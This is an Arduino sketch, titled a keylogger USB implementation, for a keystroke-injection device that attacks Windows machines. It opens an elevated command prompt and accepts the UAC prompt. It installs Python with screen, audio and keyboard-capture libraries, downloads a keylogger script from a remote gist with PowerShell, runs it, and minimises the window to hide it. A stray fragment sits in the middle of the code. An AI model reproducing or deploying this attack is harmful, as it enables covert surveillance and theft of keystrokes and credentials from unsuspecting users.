// Logan Wilmoth
// Keylogger USB Implementation

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);  // Increased for USB stability

  // Open Run dialog (Windows + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  // Open CMD as admin
  Keyboard.print("cmd");
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  // Accept UAC prompt
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1500);

  // Install Python 3.11 via winget
  Keyboard.print("winget install -e --id Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(30000);  // 30s for Python install

  // Restart CMD to refresh PATH
  Keyboard.print("exit");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  // Open CMD as admin
  Keyboard.print("cmd");
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  // Change to Downloads folder
  Keyboard.print("cd %USERPROFILE%\\Downloads");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Ensure pip is set up
  Keyboard.print("python -m ensurepip --upgrade");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("python -m pip install --upgrade pip");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);

  // Install Python dependencies (added pillow)
  Keyboard.print("pip install pyscreenshot sounddevice pynput numpy pillow");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(10000);  // 10s for install
owershell -
  // Download keylogger.py
  Keyboard.print("powershell -Command \"Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/wilmothl12/b6e22cce7d2f27f228bd3b14328d4052/raw/ec1bf2800efe71f0c1b35bec085a07fbecb94e46/keyloggerusb.py' -OutFile 'keylogger.py'\"");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);

  // Run the script
  Keyboard.print("python keylogger.py");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Minimize CMD window
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("n");
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  // Clean HID shutdown
  Keyboard.end();
  delay(1000);
  Keyboard.begin();
  Keyboard.releaseAll();
  delay(500);
  Keyboard.end();
}

void loop() {}